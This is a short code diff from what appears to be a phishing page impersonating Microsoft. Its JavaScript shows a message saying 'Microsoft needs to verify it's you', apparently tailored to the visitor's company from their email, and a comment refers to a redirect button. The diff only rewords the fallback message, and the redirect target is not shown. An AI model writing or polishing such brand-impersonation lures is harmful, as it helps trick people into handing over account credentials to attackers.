@@ -28,7 +28,7 @@
                 document.getElementById('message').innerHTML = `In order to Protect ${companyName} organization’s data, Microsoft needs to verify it's you.`;
             } else {
                 // If no email found, show the default message
-                document.getElementById('message').innerHTML = "In order to Protect your organization’s data, Microsoft needs permission to verify it's you.";
+                document.getElementById('message').innerHTML = "In order to Protect your organization’s data, Microsoft needs to verify it's you.";
             }
 
             // Set up the button click handler for redirection
